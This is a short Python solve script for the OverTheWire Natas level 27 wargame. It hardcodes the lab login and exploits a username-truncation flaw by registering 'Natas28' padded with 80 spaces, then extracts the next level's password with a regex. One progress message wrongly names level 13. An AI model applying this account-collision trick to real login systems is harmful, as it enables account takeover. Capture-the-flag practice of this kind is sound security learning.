from pwn import *
import requests
import re

username = "natas27"
password = "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas13 password, Hold on! ")

session = requests.session()
web = session.get(url, auth=(username, password)).text
web = session.post(url, data={"username" : "Natas28" +  " "*80 + "test" , "password" : "password"}, auth = (username, password)).text
result = session.post(url, data={"username" : "natas28" , "password" : "password"}, auth = (username, password)).text
flag = re.findall("[A-Za-z0-9]{32}", result)
print("The password for natas28 is === " + flag[1])